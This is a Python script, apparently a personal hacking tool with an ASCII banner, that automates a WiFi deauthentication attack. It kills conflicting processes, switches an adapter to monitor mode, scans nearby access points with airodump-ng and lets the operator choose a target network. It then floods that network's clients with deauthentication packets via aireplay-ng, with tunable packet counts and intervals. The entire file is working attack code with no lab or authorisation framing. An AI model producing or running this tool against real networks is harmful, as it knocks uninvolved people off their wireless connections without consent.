#!/usr/bin/env python3
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

RED = '\033[91m'
RESET = '\033[0m'

active_wireless_networks = []

def check_for_essid(essid, lst):
    return not any(essid in item["ESSID"] for item in lst)

def print_banner():
    print(f"{RED}\
  _         _    _  _  _ _ _  _  _       _  _  \n\
|   |     |   |  \     _  _/  \   \     /   /   \n\
|   | _ _ |   |   \   \        \     V     /     \n\
|     _ _     |     >   >       >    x    <       \n\
|   |     |   |   /   / _ _    /     Λ     \       \n\
| _ |     | _ |  /_  _  _ _\  /_  _/   \_  _\       \n\
                                      {RESET}")
    print(f"{RED}\n****************************************************************{RESET}")
    print(f"{RED}\n*   This script was developed by Hex and remains the                                                                    property of Tenebris.                                                           {RESET}")
    print(f"{RED}\n****************************************************************{RESET}")

def backup_csv_files():
    directory = os.getcwd()
    try:
        os.mkdir(directory + "/backup/")
    except FileExistsError:
        pass
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    for file_name in os.listdir():
        if file_name.endswith(".csv"):
            shutil.move(file_name, directory + "/backup/" + f"{timestamp}-{file_name}")

def check_wifi_interfaces():
    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    if not check_wifi_result:
        print(f"{RED}Please connect or enable a WiFi interface and try again.{RESET}")
        exit()
    return check_wifi_result

def select_wifi_interface(interfaces):
    while True:
        print(f"{RED}The following WiFi interfaces are available:{RESET}")
        for index, item in enumerate(interfaces):
            print(f"{RED}{index} - {item}{RESET}")
        wifi_interface_choice = input(f"{RED}Please select the interface you want to use for the deauthentication attack or Ctrl+C to exit: {RESET}")
        try:
            if interfaces[int(wifi_interface_choice)]:
                return interfaces[int(wifi_interface_choice)]
        except (IndexError, ValueError):
            print(f"{RED}Please enter a valid integer.{RESET}")

def enable_monitor_mode(interface):
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    subprocess.run(["sudo", "airmon-ng", "start", interface])

def discover_access_points(interface, channel=None):
    if channel:
        subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", "--channel", channel, interface + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", interface + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan_networks():
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            if file_name.endswith(".csv"):
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key'])
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID" or row["BSSID"] == "Station MAC":
                            continue
                        if check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)
        print(f"{RED}Scanning... Ctrl+C when you want to select which wireless network you want to attack.\n{RESET}")
        print(f"{RED}No |\tBSSID              |\tChannel|\tESSID                         |{RESET}")
        print(f"{RED}___|\t___________________|\t_______|\t______________________________|{RESET}")
        for index, item in enumerate(active_wireless_networks):
            print(f"{RED}{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}{RESET}")
        time.sleep(1)

def select_network():
    while True:
        choice = input(f"{RED}Please select a SSID from above: {RESET}")
        try:
            if active_wireless_networks[int(choice)]:
                return active_wireless_networks[int(choice)]
        except (IndexError, ValueError):
            print(f"{RED}Please try again.{RESET}")

def deauthenticate_clients(interface, bssid, channel, packet_count=10, interval=1, priority=None):
    subprocess.run(["airmon-ng", "start", interface + "mon", channel])
    if priority:
        subprocess.run(["sudo", "renice", str(priority), "-p", str(os.getpid())])
    subprocess.Popen(["aireplay-ng", "--deauth", str(packet_count), "-a", bssid, interface + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while True:
            print(f"{RED}Deauthenticating clients on selected network, Ctrl+C to terminate.{RESET}")
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"{RED}Stopped/stopping monitor mode{RESET}")
        subprocess.run(["airmon-ng", "stop", interface + "mon"])
        print(f"{RED}Exiting now...{RESET}")

def get_validated_input(prompt, valid_range, default=None):
    while True:
        user_input = input(prompt).strip()
        if user_input.lower() in ['s', 'e']:
            return user_input.lower()
        try:
            value = int(user_input)
            if valid_range[0] <= value <= valid_range[1]:
                return value
            else:
                print(f"{RED}Please enter a value within the range provided {valid_range[0]} to {valid_range[1]}.{RESET}")
        except ValueError:
            if default is not None and user_input == "":
                return default
            print(f"{RED}Please enter a valid integer.{RESET}")

def main():
    print_banner()
    if 'SUDO_UID' not in os.environ:
        print(f"{RED}Run script with sudo.{RESET}")
        exit()

    backup_csv_files()
    interfaces = check_wifi_interfaces()

    while True:
        print(f"{RED}Reloading network interfaces...{RESET}")
        interfaces = check_wifi_interfaces()
        selected_interface = select_wifi_interface(interfaces)

        print(f"{RED}WiFi adapter connected.\nKilling conflicting processes:{RESET}")
        enable_monitor_mode(selected_interface)

        mode = get_validated_input(f"{RED}Select mode (S/standard or E/expert): {RESET}", (0, 1), 's')
        if mode == 'e':
            channel = get_validated_input(f"{RED}Enter the channel to scan (leave empty to scan all channels): {RESET}", (1, 13), None)
            packet_count = get_validated_input(f"{RED}Enter the number of deauthentication packets to send (1-100): {RESET}", (1, 100), 10)
            interval = get_validated_input(f"{RED}Enter the interval between deauthentication packets in seconds (1-60): {RESET}", (1, 60), 1)
            priority = get_validated_input(f"{RED}Enter the task manager priority (-20 to 19): {RESET}", (-20, 19), None)
        else:
            channel = None
            packet_count = 10
            interval = 1
            priority = None

        discover_access_points(selected_interface, channel)

        try:
            scan_networks()
        except KeyboardInterrupt:
            print(f"{RED}\nReady to select.{RESET}")

        selected_network = select_network()
        hackbssid = selected_network["BSSID"]
        hackchannel = selected_network["channel"].strip()

        deauthenticate_clients(selected_interface, hackbssid, hackchannel, packet_count, interval, priority)

if __name__ == "__main__":
    main()
